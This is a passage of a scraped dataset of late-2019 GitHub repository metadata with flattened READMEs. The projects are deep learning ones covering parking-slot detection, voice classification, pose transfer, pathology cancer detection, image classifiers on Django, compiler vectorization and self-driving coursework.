SAVEFILES Example ps2 0 dataset Test on the ps2 0 dataset The detection results including images and files will be saved python vpsnet py inputfolder data ps2 0 testing all savefiles 1 Testing results Extral annotation In order to facilitate other researchers the annoation https drive google com file d 1IQxiXrfdIxfpHaTWyXGHQCvZUSRMTGSK view usp sharing for vacant parking slots of ps 2 0 and PSV datasets has been made publicly avaliable,2019-11-10T12:39:12Z,2019-11-28T01:40:14Z,Python,weili1457355863,User,1,2,0,9,master,weili1457355863,1,0,0,0,0,0,0
MarvinLvn,voice-type-classifier,n/a,SincNet and LSTM based Voice Type Classifier Architecture of our model docs archisincnet png In this repository you ll find all the necessary code for applying a pre trained model that given an audio recording classifies each frame into SPEECH KCHI CHI MAL FEM FEM stands for female speech MAL stands for male speech KCHI stands for key child speech CHI stands for other child speech SPEECH stands for speech Our model has been developped in JSALT 1 and its architecture is based on SincNet 2 The code mainly relies on pyannote audio 3 an awesome python toolkit for building neural building blocks that can be combined to solve the speaker diarization task How to use 0 Disclaimer docs disclaimer md 1 Installation docs installation md 2 Applying docs applying md 3 Evaluation docs evaluations md 4 Going further docs evaluation md References 1 Paola Garcia et al Speaker detection in the wild Lessons learned from JSALT 2019 arXiV https arxiv org abs 1912 00938 2 Mirco Ravanelli Yoshua Bengio Speaker Recognition from raw waveform with SincNet arXiV https arxiv org abs 1808 00158 3 Herv Bredin et al pyannote audio neural building blocks for speaker diarization arXiV https arxiv org abs 1911 01255,2019-12-03T12:52:00Z,2019-12-12T14:24:00Z,Shell,MarvinLvn,User,1,2,0,23,master,MarvinLvn,1,0,0,0,3,0,0
Vishwesh4,Everybody-dance-now,conditional-gan#deep-learning#everybody-dance-now#fortnite#gans#images#machine-learning#machinelearningprojects#pix2pix#python#pytorch,Everybody Dance Now This repository tries to implement Everybody Dance Now https arxiv org abs 1808 07371 by pytorch Lot of inspiration has been taken from multiple repositories Since I was encountering some problems running their repositories I created a rectified version of theirs with more utilities and documentation for the purpose of learning Please get back to me if faced with any issues or bugs Repositories which I took inspiration from yanx27 https github com CUHKSZ TQL EverybodyDanceNowreproducepytorch EverybodyDanceNow reproduced in pytorch nyoki pytorch https github com nyoki mtl pytorch EverybodyDanceNow pytorch EverybodyDanceNow pix2pixHD https github com NVIDIA pix2pixHD Final Results Alttext https raw github com Vishwesh4 Everybody dance now master images output gif Introduction This project will enable the user to transfer whatever pose they want to the game character which otherwise involves a lot of finesse and experience The network will detect those poses and will create a game character enacting those poses In this project I will only model and focus on generating poses for a single game character In the paper Everybody dance now by Caroline Chan et al 1 the group had focused on transferring the pose of a source video usually consisting of a professional dancer to a target video consisting of people with no experience in that field I will extend it to game figures I will also use the Openpose model and the Conditional GAN CGAN structure from pix2pix However I will not do multiple screen predictions by Generator as mentioned in paper for temporal coherence Pose estimation x Pose Face Hand x pix2pixHD FaceGAN Temporal smoothing Methodology To solve the problem statement we needed to convert a pose from domain f x to the desired game character in that pose g x Where x is the desired pose The problem is broken into two parts 1 Pose estimation to procure x 2 Using CGAN model to transform x to desired game character pose The pose estimation was successfully done by using the Openpose algorithm developed by CMU Alttext https raw github com Vishwesh4 Everybody dance now master images img1 png We have used the following architecture called pix2pix which is a type of CGAN developed by NVIDEA for the purpoe of transforming the image from one domain to another Using this step we successfully obtain g x Alttext https raw github com Vishwesh4 Everybody dance now master images img2 png Results Training Loss curve The training is done stochasitcally Alttext https raw github com Vishwesh4 Everybody dance now master images img3 png Cross validation Results The model was tested on cross validation set of 112 samples We get the following results Alttext https raw github com Vishwesh4 Everybody dance now master images img4 png Generated images on cross validation set Alttext https raw github com Vishwesh4 Everybody dance now master images img5 png Test Results Alttext https raw github com Vishwesh4 Everybody dance now master images img6 png Negetive results Alttext https raw github com Vishwesh4 Everybody dance now master images img7 png 1 The star was not printed on the t shirt 2 Overlap of hand was not registered 3 Due to incomplete pose estimation the generated image has a missing hand Initial learning Alttext https raw github com Vishwesh4 Everybody dance now master images img8 png We wanted to see how the pix2pix model starts to learn Observations 1 Initially during the first learning iteration the model produces a random image based on the initialized parameters 2 The background is still separated in the first generated image because of input background color being black which is different from the stick figure 3 After 50 iterations we see that the model has learned to identify background color as blue and is able to localize the target figure clearly 4 After 50 more iterations the model has learned to generate body parts related to each stick color in the figure 5 It has also learned to generate a graded background Getting Started These instructions will get you a copy of the project up and running on your local machine for development and testing purposes Note that your local environment should be cuda enabled from both pose detection and pose transfer Prerequisites Libraries needed openpose dominate pytorch gpu Dataset The dataset consisting of 26000 images was procured from a fortinite dance video https www youtube com watch v WU34PB2IaIchttps www youtube com watch v WU34PB2IaIc You can also train on your own dataset Procure images of a well lit target character person and store it in dataset trainB Using main codes OpenPosefinalstep1 ipynb to make pose skeletons and store it in dataset trainA This code can also be used as a generic transformer which can transform images in domain A trainA to images in domain B trainB To do that you might need to change some settings in config trainopt py The setting documentation can be found in pix2pixHD repository Note If your trainA contains images with multiple classes please follow the instructions as given in pix2pixHD repository Training Once the data pipeline is setup run main codes MainTrainingstep2 ipynb The results can be found in checkpoints PoseGame directory Testing Cross validation can be performed by putting images and its label in the datasettest directory Once setup run main codes MainTeststep3 ipynb Its results can be observed in checkpoints PoseGametest To perform transfer given labels put all the labels in datasettransfer testA folder and run main codes PoseTransferstep4 ipynb The results can be observed in results PoseGame Running the test files Before running the main code ensure that the label images are in trainA folder and the target images are in trainB folder A single image has been left for example File description 1 main codes OpenPosefinalstep1 ipynb Its the first step to transfer images to pose The code is written for running on google collab due to additional packages that are required to install 2 main codes MainTrainingstep2 ipynb This is 2nd step in pipeline Main code for training The results of the notebook will be found in checkpoints PoseGame 3 main codes MainTeststep3 ipynb This notebook is the 3rd step It runs on cross validation set to give idea of losses and images The results of the notebook will be found in checkpoints PoseGametest 4 main codes PoseTransferstep4 ipynb This notebook is the 4th step This notebook finally transfers the given input poses to the target image The results can be found in results folder 5 main codes forepochpics ipynb This notebook just displays iteration wise images for the purpose of visualization The results can be found in checkpoints Initialepoch 6 dataset directory for training The poses goes to trainA folder and the target image goes to trainB folder 7 datasettest directory for cross validation set The heirchacy is same as dataset folder 8 datasettransfer Transfers pose mentioned in testA directory to target images 9 config contains file for setting hyper parameters See pix2pixHD repository for more information 10 src directory containing pix2pixHD repository Reference Everybody Dance Now https arxiv org abs 1808 07371 Image to Image Translation with Conditional Adversarial Networks pix2pix https arxiv org pdf 1611 07004 pdf,2019-11-23T14:57:55Z,2019-12-07T19:05:03Z,Jupyter Notebook,Vishwesh4,User,1,2,0,8,master,Vishwesh4,1,0,0,0,0,0,0
Liubuntu,BiocGenerator,n/a,,2019-12-04T22:00:35Z,2019-12-05T15:46:22Z,R,Liubuntu,User,1,2,0,3,master,Liubuntu,1,0,0,0,0,0,0
arefbhrn,IRDebitCardScanner,android#credit-card#creditcard#debit-card#debitcard#deep-learning#library#realtime#scanner#tensorflow#tensorflow-lite#tensorflowlite#tf-lite#tf-lite-on-android#tflite,https jitpack io v arefbhrn IRDebitCardScanner svg https jitpack io arefbhrn IRDebitCardScanner IR Debit Card Scanner A lightweight android library to scan Iranian debit cards fast and realtime using Deep Learning and TensorFlow Lite This library scans valid card numbers only Keep in mind that split ABIs while releasing your app to reduce its size To check stability and scan speed check STABILITY md STABILITY md file Preview art mellat gif Installation Gradle dependencies implementation com github arefbhrn IRDebitCardScanner 1 0 0 How To Use 1 Start scanner activity and wait for result ScanActivity start this 2 Retrieve scanned data java Override protected void onActivityResult int requestCode int resultCode Intent data super onActivityResult requestCode resultCode data if ScanActivity isScanResult requestCode resultCode Activity RESULTOK data null DebitCard scanResult ScanActivity debitCardFromResult data if scanResult null Log d IRDCS scanResult number Debug Mode 1 Start scanner activity in debug mode ScanActivity startDebug this In this mode you will see a scanned preview while scanning Alternative Texts 1 Start scanner activity with alternative texts ScanActivity start this IRDC Scanner Position your card in the frame so the card number is visible In this mode texts in scanner activity would be set as you prefer Contact me If you have a better idea or way on this project please let me know Thanks Email mailto arefprivate gmail com Website En http arefdev ir en Website Fa http arefdev ir License This project is licensed under the GNU GPL 3 0 License see the LICENSE md LICENSE md file for details References Based on this https github com getbouncer cardscan android project,2019-11-06T09:04:31Z,2019-12-12T03:36:55Z,Java,arefbhrn,User,1,2,0,5,master,arefbhrn,1,1,1,0,0,0,0
YC-Coder-Chen,Detecting-Cancer-on-Gigapixel-Images,deep-learning#detecting-cancer-metastases#gigapixel-images#keras#tensorflow#tensorflow2,Detecting Cancer Metastases on Gigapixel Pathology Images Columbia University Applied Deep Learning Course Project Fall 2019 Author Yingxiang Chen Columbia Uni yc3526 Video Demo https youtu be h6wJMuvgd4M Objective Current Situation Microscopic examination of lymph nodes is crucial in breast cancer staging Currently the manual process requires highly skilled pathologists The process is fairly time consuming and error prone particularly for lymph nodes with either no or small tumors So I want to follow the strategy in the paper https arxiv org pdf 1703 02442 pdf and utilize the deep learning models techniques to relieve the workload of physicians by creating a workflow to detect and locate tumor pixels in the images and offer automatic second opinions Dataset Raw Data 21 Gigapixel Pathology Images each has a tumor slide and a corresponding mask from The CAMELYON16 challenge https camelyon16 grand challenge org Data Trainset 8000 4000 each at two different zoom levels image patches sampled from 16 Gigapixel Pathology Images Validation set 1600 800 each at two different zoom levels image patches sampled from 2 Gigapixel Pathology Images Test set 3 Gigapixel Pathology Images Image augmentation Adopt similar augmentation strategies discussed in the paper https arxiv org pdf 1703 02442 pdf Use Keras ImageDataGenerator to augment data Horizontalflip Verticalflip Rescale Widthshift Heightshift Rotation Use TensorFlow image random function to augment data Random brightness Random saturation Random hue Random contrast Model Transfer Learning Used two pre trained inception v3 models on Imagenet to speed up the training process Global Pooling Applied GlobalAveragePooling layer after the inception model to significantly reduce parameters img photo model png Result The result on slide 075 img photo 075 png THe result on slide 091 img photo 091 png The result on slide 096 img photo 096 png Final Deliverable Notebook 1 Data Sampling Jupyter Notebook NB1DataCleaning ipynb Colab Version https colab research google com github YC Coder Chen Detecting Cancer on Gigapixel Images blob master NB1DataCleaning ipynb Notebook 2 Data Modeling Evaluation Jupyter Notebook NB2Modeling ipynb Colab Version https colab research google com github YC Coder Chen Detecting Cancer on Gigapixel Images blob master NB2Modeling ipynb Final Model Shared in Google drive https drive google com file d 1kt5kMZrFY7axUAha1VWU6nqpfjHUrv view usp sharing Shared in Google storage https storage cloud google com adl project yc3526 weights 12 0 94 hdf5 Project Introduction Video Demo Pdf version ADLPresentFinal pdf Youtube Video Demo https youtu be h6wJMuvgd4M,2019-11-29T22:12:08Z,2019-12-12T06:58:17Z,Jupyter Notebook,YC-Coder-Chen,User,1,2,0,9,master,YC-Coder-Chen,1,0,0,0,0,0,0
gott51010,goForIt,n/a,go for it I m trying to make a project about deep learning It would be useful to make my recommendation system python gives me programming power,2019-11-21T02:02:43Z,2019-12-11T00:56:12Z,n/a,gott51010,User,1,2,1,6,master,gott51010,1,0,0,0,0,0,1
XinshaoAmosWang,OSM_CAA_WeightedContrastiveLoss,deep-metric-learning#image-recognition#person-reidentification#person-retrieval#video-recognition,Deep Metric Learning by Online Soft Mining and Class Aware Attention AAAI 2019 Oral ML Technical Track Paper https arxiv org pdf 1811 01459 pdf Slides https drive google com file d 1Z44yvdrnrjIeH8x2A4e9 r275y25piKo view usp sharing Poster https drive google com file d 1PpCpD9HLtYJQK2tGtsgIhlr1HZ3IF8zF view usp sharing Good news Inspired by some peers interest in our work we are glad to release our source code for exactly reproducing our results on 4 datasets For reproducing purpose please do not use cudnn and change our random seed To make GoogLeNet V2 trainable on Single GPU GeForce GTX 1080 Ti with 12 GB memory we used very small batch size 54 in our experiments You may get better results if you use larger batch size and more powerful computational resources Dependencies Setup The core functions are implemented in the caffe https github com BVLC caffe framework We use matlab interfaces matcaffe for data preparation Clone our repository bash git clone git github com XinshaoAmosWang OSMCAAWeightedContrastiveLoss git Install dependencies on Ubuntu 16 04 http caffe berkeleyvision org installapt html bash sudo apt get install libprotobuf dev libleveldb dev libsnappy dev libopencv dev libhdf5 serial dev protobuf compiler sudo apt get install no install recommends libboost all dev sudo apt get install libopenblas dev sudo apt get install python dev sudo apt get install libgflags dev libgoogle glog dev liblmdb dev Install MATLAB 2017b https uk mathworks com products newproducts release2017b html Download and Run the install binary file bash install Compile Caffe and matlab interface Note you may need to change some paths in Makefile config according your system environment and MATLAB path To exactly reproduce our results please do not use cudnn It is commented in the Makefile config file bash cd OSMCAAWeightedContrastiveLoss CaffeMexV28 make j8 make matcaffe Usage Matlab data files and pretrained GooLeNet V2 model on ImageNet 2012 https drive google com drive folders 1PHBiqQ8 t4DxgMgERXeDA8LP6gayW6T usp sharing Download the corresponding data files of each dataset Unzip and Copy to their corresponding training folders bash rsync a v DataOSMCAAWeightedContrastiveLoss V01 cp DataOSMCAAWeightedContrastiveLoss googlenetbn caffemodel CARS196V01 pretrainmodel cp DataOSMCAAWeightedContrastiveLoss googlenetbn caffemodel CUBV01 pretrainmodel cp DataOSMCAAWeightedContrastiveLoss googlenetbn caffemodel MARSV01 pretrainmodel cp DataOSMCAAWeightedContrastiveLoss googlenetbn caffemodel LPWV01 pretrainmodel Examples for reproducing our results on CARS196 CUB 200 2011 MARS LPW are given Data preparation for CARS196 CUB 200 2011 Since they are small datasets we store them into mat files for easier use Therefore you can use them directly without extra effort e g downloading and read them into mat files Data preparation for MARS or LPW please refer to Ranked List Loss https github com XinshaoAmosWang Ranked List Loss for DML usage the pipeline is similar Custom data preparation please refer to Ranked List Loss https github com XinshaoAmosWang Ranked List Loss for DML usage the pipeline is similar Train Test Run the training and testing scripts in the training folder of a specific setting defined by its corresponding prototxt folder Examples CARS196 cd CARS196V01 trainMWIDEASiameseV62e1 Train bash matlab nodisplay nosplash nodesktop r run train m exit tail n 11 Test bash matlab nodisplay nosplash nodesktop r run testmodel m exit tail n 11 CUB 200 2011 cd CUBV01 trainMWIDEASiameseV42e1 Train bash matlab nodisplay nosplash nodesktop r run train m exit tail n 11 Test bash matlab nodisplay nosplash nodesktop r run testmodel m exit tail n 11 Citation If you find our code and paper make your research or work a little bit easier it would be our great pleasure If that is the case please kindly cite our paper Thanks bash inproceedingswang2019deep title Deep metric learning by online soft mining and class aware attention author Wang Xinshao and Hua Yang and Kodirov Elyor and Hu Guosheng and Robertson Neil M booktitle Proceedings of the AAAI Conference on Artificial Intelligence volume 33 pages 5361 5368 year 2019 Acknowledgements Our work benefits from Hyun Oh Song Yu Xiang Stefanie Jegelka and Silvio Savarese Deep Metric Learning via Lifted Structured Feature Embedding In IEEE Conference on Computer Vision and Pattern Recognition CVPR 2016 http cvgl stanford edu projects liftedstruct CaffeMexv2 library https github com sciencefans CaffeMexv2 tree 9bab8d2aaa2dbc448fd7123c98d225c680b066e4 Caffe library https caffe berkeleyvision org Licence BSD 3 Clause New or Revised License Affiliations Queen s University Belfast UK Anyvision Research Team UK Contact Xinshao Wang You can call me Amos as well xwang39 at qub ac uk Relevant Work ID aware Quality for Set based Person Re identification https arxiv org pdf 1911 09143 pdf Without weighted contrastive loss bash articlewang2019id title ID aware Quality for Set based Person Re identification author Wang Xinshao and Kodirov Elyor and Hua Yang and Robertson Neil M journal arXiv preprint arXiv 1911 09143 year 2019,2019-11-30T10:04:13Z,2019-12-13T07:13:31Z,MATLAB,XinshaoAmosWang,User,1,2,0,8,master,XinshaoAmosWang,1,0,0,1,0,0,0
nature1995,Image-classifiers-on-Django-with-RESTAPI-V2,classifier-model#django#machine-learning#web-application,Image classifiers on Django with RESTAPI V2 python3 5 https img shields io badge python 3 5 blue svg python3 6 https img shields io badge python 3 6 brightgreen svg python3 6 https img shields io badge python 3 7 orange svg django3 0 0 https img shields io badge django 3 0 0 brightgreen svg Table of Contents Introduction introduction Description description Features features Architecture architecture Usage usage Results results Issue issue Others others License license Introduction A Keras deep learning image classifiers on Django server with REST API It can help you quickly deploy and apply ML models Description Machine Learning ML models are typically trained and test on benchmark data sets However such data sets may not represent the data in real applications These ML models should be updated after tested on real data sets Deployment of the models after each update may be time consuming Therefore automated deployment is needed to save time and effort In this proposal we describe our solution to integrate trained ML models into any application of interest We use Django web based platform to build REST API for model deployment Jenkins is used for continuous integration and automated deployment of ML models into Django servers Features x Add Account management funtion x Add Login Signup x Add Django Rest Framework x Optimize front end interface adapt to mobile and PC interface x Design front end and back end interactive interfaces x Add feature Image classify using following model x ResNet50 x Xception x MobileNet MobileNetV2 x InceptionV3 InceptionResNetV2 x DenseNet121 DenseNet169 DenseNet201 x VGG16 VGG19 x NASNetMobile NASNetLarge x Run each part of functions seperately in local and cloud server x Run all the functions in local server and cloud server x Design and using machine learning CI CD Tools such as Git Jenkins Nginx uwgsi for deployment Architecture Usage I assume you already have your own local virtual environment git clone https github com nature1995 image classify django server git pip install r requirements txt python manage py makemigrations Option python manage py migrate Option python manage py collectstatic Option python manage py runserver 0 0 0 0 8000 Access the web page though this link http 127 0 0 1 8000 If you would like to use the previous version https github com nature1995 AI Image classifiers on Django with RESTAPI Here is the link Docker You can use dockerfile to build this project easily sh Follow any instruction to install the docker ce docker for OS X or PC in your device docker build t aiimageclassifiers docker run it rm p 8000 8000 name aiimageclassifiersapp aiimageclassifiers latest Results Name Input Size API address ResNet50 224x224 http 127 0 0 1 8000 predict api Xception 299x299 http 127 0 0 1 8000 predictXception api MobileNet 224x224 http 127 0 0 1 8000 predictMobileNet api MobileNetV2 224x224 http 127 0 0 1 8000 predictMobileNetV2 api InceptionV3 299x299 http 127 0 0 1 8000 predictInceptionV3 api InceptionResNetV2 224x224 http 127 0 0 1 8000 predictInceptionResNetV2 api DenseNet121 224x224 http 127 0 0 1 8000 predictDenseNet121 api DenseNet169 224x224 http 127 0 0 1 8000 predictDenseNet169 api DenseNet201 224x224 http 127 0 0 1 8000 predictDenseNet201 api VGG16 224x224 http 127 0 0 1 8000 predictVGG16 api VGG19 224x224 http 127 0 0 1 8000 predictVGG19 api NASNetLarge 331x331 http 127 0 0 1 8000 predictNASNetLarge api NASNetMobile 224x224 http 127 0 0 1 8000 predictNASNetMobile api Input Parameter Type Description image file Image file that you want to classify top text optional default 6 Return top k categories of the results Must me string in integer format Note You can not send a very large size image Result Parameter Type Description success bool Whether classification was sucessfuly or not predictions label float pair of label and it s probability Accuracy for individual models Model Accuracy Top 6 Accuracy Xception 0 780 0 955 VGG16 0 722 0 914 VGG19 0 723 0 910 ResNet50 0 748 0 931 InceptionV3 0 789 0 948 InceptionResNetV2 0 813 0 963 MobileNet 0 714 0 904 MobileNetV2 0 723 0 912 DenseNet121 0 761 0 934 DenseNet169 0 772 0 952 DenseNet201 0 783 0 945 NASNetMobile 0 752 0 920 NASNetLarge 0 837 0 959 Example Using Postman https www getpostman com downloads to test the API POST http 127 0 0 1 8000 predict api Result success true predictions label redfox probability 0 8969062566757202 label kitfox probability 0 08841043710708618 label greyfox probability 0 012036639265716076 label Arcticfox probability 0 0022438077721744776 label coyote probability 0 0002566342300269753 label whitewolf probability 0 00005685776341124438 Compatibility Support to Django 2 1 5 or Django 3 0 0 and Python 3 5 3 6 3 7 Issue If you have questions or issues please feel free to tell us Contribution Welcome to make pull request If you have a related project component tool add it with a pull request to add it Others Admin Account python manage py createsuperuser username ranxiaolang email YOUR EMAIL password ranxiaolang Access the web page though this link http 127 0 0 1 8000 admin Contributors nature1995 http ranxiaolang com License MIT LICENSE,2019-11-24T00:03:12Z,2019-12-06T19:56:15Z,HTML,nature1995,User,1,2,0,13,master,nature1995,1,0,0,0,0,0,0
anandkashyap4711,AI-Training-Material-By-Harman-,n/a,AI Training Material By Harman This repo belongs to complete AI training which has been Provided by Harman Corporate Trainer j P Mishra has Provided thsi training for 27 Hours In which i have learnt Basic machine Learning Model Deployment Concept of Deep Learning and computer vision He also suggested some good books for deep learning so that i can learn the concept from scratch,2019-12-07T01:12:35Z,2019-12-09T16:18:15Z,Jupyter Notebook,anandkashyap4711,User,1,2,1,2,master,anandkashyap4711,1,0,0,0,0,0,0
premnathdey,Food_master,n/a,foodmaster TO DESIGN A WEB BASED APPLICATION THAT RECOMMENDS A USER ABOUT THE FOOD TO BE TAKEN BASED ON CALORIE REQUIREMENTS USING DEEP LEARNING,2019-11-18T16:10:17Z,2019-11-23T11:18:38Z,Jupyter Notebook,premnathdey,User,1,2,1,38,master,premnathdey#mesc08#Subham2804,3,0,0,0,0,0,0
Intel-Academic,NeuroVectorizer,n/a,NeuroVectorizer Neurovectorizer is a framework that uses deep reinforcement learning RL to predict optimal vectorization compiler pragmas for for loops in C and C codes The framework currently integrates with the LLVM compiler and can inject vectorization and interleaving factors It is possible to support unrolling factors too by adding it as an action in the RL environment More details are available in the paper This paper appeared in CGO2020 and Passed all the artifact evaluations for reproducability Dependencies TF2 Ray RLlib LLVM and clang The framework takes the text code of loops detects them in the code and uses an embedding generator The output of this generator is fed to a neural network agent that predicts the optimal factors There are two modes of operation of this framework 1 If you decide to use a neural network as a code embedding generator it might be better to train end to end the gradients of the NN of the RL agents back propogate to the input of the embedding generator In that case you just have to run python autovec py and if necessary modify autovec py or envs neurvec py mainly to change hyperparameters Currently we implemented a neural network model based on code2vec To use code2vec you have first to run cd preprocess source configure sh you need here to modify CODE2VECLOC and SOURCEDIR to point to your files source preprocess sh this will generate the bag of words of the training set for code2vec the training set is in trainingdata feel free to add more samples python autovec py Note that this will take a long time to finish training If you want to use another neural network in the embedding generator you need to modify getobs function in envs neurovec py and use that model in autovec py follow the TODOs in the code 2 If you do not need to do end to end training for example a pretrained code embedding generator or use your own embedding generator that is not necessarily neural networks then you need to modify this line https github com AmeerHajAli NeuroVectorizer blob e5e162761e6b51889b085fec2999f4780c0f91ec envs neurovec py L52 if you are using a pickle file of all the embeddings or getobs function in envs neurovec py to return your embedding if you want it to query the generator in each step Please reach out to Ameer Haj Ali for any questions To cite this work inproceedingsameerhajalicgo author Haj Ali Ameer and Ahmed Nesreen and Willke Ted and Shao Sophia and Asanovic Krste and Stoica Ion title NeuroVectorizer End to End Vectorization with Deep Reinforcement Learning booktitle Proceedings of the 2020 International Symposium on Code Generation and Optimization series CGO 2020 year 2020 location San Diego USA publisher ACM,2019-11-06T09:04:15Z,2019-12-13T21:03:07Z,C,Intel-Academic,Organization,5,2,0,38,master,AmeerHajAli,1,0,0,0,0,0,0
kimoye,XDL,n/a,XOSX Deep Learning Lisence https img shields io badge License GPL green Author0 https img shields io badge Author kimoye red Author1 https img shields io badge Author Lynn red Author2 https img shields io badge Author MAX red XDL DLUT Python https github com kimoye XDL books GitHub To Do List 0,2019-12-04T11:38:04Z,2019-12-04T13:52:56Z,n/a,kimoye,User,1,2,0,2,master,kimoye,1,0,0,0,0,2,0
bhuyanamit986,Cat-vs-Dog,n/a,Cat vs Dog Here I made my own neural network from scratch during my Neural Networks and Deep Learning course from deeplearning ai by Andrew Ng I trained a class vs dog dataset on my neural network and had found accuracy of 80 on evaluation,2019-11-09T17:08:08Z,2019-11-22T13:19:42Z,Jupyter Notebook,bhuyanamit986,User,1,2,0,2,master,bhuyanamit986,1,0,0,0,0,0,0
darrickz,Self_Driving_Car,n/a,Self Driving Car First apply computer vision and deep learning to automotive problems including detecting lane lines predicting steering angles and more Next learn about sensor fusion to filter data from an array of sensors in order to perceive the environment Then you ll work with a team to program Carla Udacitys real self driving car Projects Project 1 Advanced Lane Line Detection https github com darrickz SelfDrivingCar tree initdev CarND Advanced Lane Lines In this project the goal is to write a software pipeline to identify the lane boundaries in a video Compute the camera calibration matrix and distortion coefficients given a set of chessboard images Apply a distortion correction to raw images Use color transforms gradients etc to create a thresholded binary image Apply a perspective transform to rectify binary image birds eye view Detect lane pixels and fit to find the lane boundary Determine the curvature of the lane and vehicle position with respect to center Warp the detected lane boundaries back onto the original image Output visual display of the lane boundaries and numerical estimation of lane curvature and vehicle position Advanced Lane Line Detection Project 2 Traffic Sign Classification https github com darrickz SelfDrivingCar tree initdev CarND Traffic Sign Classifier In this project a convolutional neural network is implemented to classify traffic signs The traffic sign images is the German Traffic Sign Dataset Load the data set Explore summarize and visualize the data set Design train and test a model architecture Use the model to make predictions on new images Analyze the softmax probabilities of the new images Summarize the results with a written report Data Distribution Accuracy Project 3 Extended Kalman Filter https github com darrickz SelfDrivingCar tree initdev CarND Extended Kalman Filter Utilize a kalman filter to estimate the state of a moving object of interest with noisy lidar and radar measurements Project 4 Kidnapped Vehicle https github com darrickz SelfDrivingCar tree initdev CarND Kidnapped Vehicle Figure out the Vehicle location based on map a noisy GPS estimate and other sensors data Project 5 Behavioral Cloning https github com darrickz SelfDrivingCar tree initdev CarND Behavioral Cloning Using deep neural networks and convolutional neural networks to clone driving behavior Model is trained validated and tested using Keras and output a sterring angle to an autonomous vehicle Behavioral Cloning Project 6 PID Control https github com darrickz SelfDrivingCar tree initdev CarND PID Control This project is to develop a PID controller given the cross track error CTE and the velocity mph provided by simulator The goal is the car can be successfully navigated around the track PID Control Project 7 Path Planning https github com darrickz SelfDrivingCar tree initdev CarND Path Planning The goal of this project is to safely navigate car around a virtual highway with other traffic that is driving 10 MPH of the 50 MPH speed limit The car s localization and sensor fusion data are given there is also a sparse map list of waypoints around the highway Path Planning Project 8 Programming Real Car https github com darrickz SelfDrivingCar tree initdev CarND Capstone This project is to implement ROS nodes of core functionality of the autonomous vehicle system including traffic light detection control and waypoint following Code are tested using a simulator and when the code is ready it is submited to be run on Carla,2019-11-25T05:24:03Z,2019-12-07T21:11:10Z,C++,darrickz,User,1,2,0,10,master,dzaiml2018#darrickz,2,0,0,0,0,0,0
drprajapati,APTOSBlindnessDetection,n/a,,2019-12-09T20:50:16Z,2019-12-12T05:31:40Z,Java,drprajapati,User,3,2,0,9,master,umangjpatel,1,0,0,0,0,0,0
RohitGandikota,Hiding-Images-using-VAE-Genarative-Adversarial-Networks,n/a,Hiding Images using VAE Genarative Adversarial Networks In this work we demonstrate the application of Variational Autoencoder Generative Adversarial Network VAE GAN in multimedia data hiding Unlike traditional deep learning techniques using single architectures this method exploits the advantages of both VAE and GAN in data hiding to devise an integrated and robust information hiding method We present an end to end trainable model of VAE GAN which can learn to embed a message image onto a cover image The devised architecture consists of a VAE with adversarial training as embedder and a fully convolutional network with adversarial training as the extractor The encoded image is subjected to multiple attacks and it is established that the proposed method is robust towards attacks like Gaussian blurring rotation noise and cropping The one remarkable feature of our method is that it can be trained to recover against various attacks Hence it is possible to make it more robust by training the network on other popular attacks,2019-11-09T11:43:05Z,2019-11-26T12:10:27Z,Python,RohitGandikota,User,1,2,0,3,master,RohitGandikota,1,0,0,0,0,0,0
arpit1920,Extractive-Text-Summerization,n/a,Extractive Text Summerization Summarization systems often have additional evidence they can utilize in order to specify the most important topics of document s For example when summarizing blogs there are discussions or comments coming after the blog post that are good sources of information to determine which parts of the blog are critical and interesting In scientific paper summarization there is a considerable amount of information such as cited papers and conference information which can be leveraged to identify important sentences in the original paper How text summarization works In general there are two types of summarization abstractive and extractive summarization Abstractive Summarization Abstractive methods select words based on semantic understanding even those words did not appear in the source documents It aims at producing important material in a new way They interpret and examine the text using advanced natural language techniques in order to generate a new shorter text that conveys the most critical information from the original text It can be correlated to the way human reads a text article or blog post and then summarizes in their own word Input document understand context semantics create own summary 2 Extractive Summarization Extractive methods attempt to summarize articles by selecting a subset of words that retain the most important points This approach weights the important part of sentences and uses the same to form the summary Different algorithm and techniques are used to define weights for the sentences and further rank them based on importance and similarity among each other Input document sentences similarity weight sentences select sentences with higher rank The limited study is available for abstractive summarization as it requires a deeper understanding of the text as compared to the extractive approach Purely extractive summaries often times give better results compared to automatic abstractive summaries This is because of the fact that abstractive summarization methods cope with problems such as semantic representation inference and natural language generation which is relatively harder than data driven approaches such as sentence extraction There are many techniques available to generate extractive summarization To keep it simple I will be using an unsupervised learning approach to find the sentences similarity and rank them One benefit of this will be you dont need to train and build a model prior start using it for your project Its good to understand Cosine similarity to make the best use of code you are going to see Cosine similarity is a measure of similarity between two non zero vectors of an inner product space that measures the cosine of the angle between them Since we will be representing our sentences as the bunch of vectors we can use it to find the similarity among sentences Its measures cosine of the angle between vectors Angle will be 0 if sentences are similar All good till now Hope so Next Below is our code flow to generate summarize text Input article split into sentences remove stop words build a similarity matrix generate rank based on matrix pick top N sentences for summary,2019-11-15T18:36:12Z,2019-12-12T18:00:56Z,Jupyter Notebook,arpit1920,User,1,2,0,2,master,arpit1920,1,0,0,0,0,0,0
hongbozhou,deep_learning_101,n/a,deeplearning101 jupyter notebook for python numpy pytorch cnn This is a collection of tutorials on basic Python basic numpy and basic pytorch tensor and cnn for MNIST dataset I have borrowed many codes and notes from internet I need to find sometime to give back their credits,2019-11-13T01:49:26Z,2019-12-05T19:24:55Z,Jupyter Notebook,hongbozhou,User,2,1,2,4,master,hongbozhou,1,0,0,0,0,0,0
Ten-AI,garbage-classification,n/a,Garbage Classification Todo mobileNet v3 yolo v3 resnet denseNet label4 Flow images flow png Schedule images gcs v1 png DataSets https storage googleapis com openimages web download html Application Scenarios Mini program Take out APP 20001800w https baike baidu com item E9 9D 92 E5 B1 B1 E8 AE A1 E5 88 92 22917297 fr aladdin Log log md References 1ImageNet https blog csdn net weixin42364977 article details 82822026 weiaicunzai awesome image classification https github com weiaicunzai awesome image classification,2019-12-01T10:43:10Z,2019-12-03T11:04:46Z,Jupyter Notebook,Ten-AI,Organization,1,1,2,1,master,bertzhoubowen,1,0,0,1,0,1,1
